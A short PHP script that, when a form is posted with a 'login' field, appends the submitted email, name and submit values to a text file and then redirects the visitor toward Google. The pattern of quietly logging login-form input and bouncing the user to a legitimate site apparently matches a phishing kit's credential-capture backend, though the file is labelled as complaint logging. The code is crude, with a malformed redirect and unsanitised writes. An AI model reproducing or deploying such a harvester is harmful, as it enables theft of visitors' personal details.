<?php
if($_POST["login"]){
    $file = fopen("complaint.txt" , "a") or die("cant oprn file");
    $complaint = $_POST["email"] . "\n";
    fwrite($file , $complaint);
    $complaint = $_POST["name"] . "\n";
    fwrite($file , $complaint);
    $complaint = $_POST["submit"] . "\n";
    fwrite($file , $complaint);
    fwrite($file , "session end===");
    fclose($file);
}

?>

<script>location.href="www.google.com";</script>
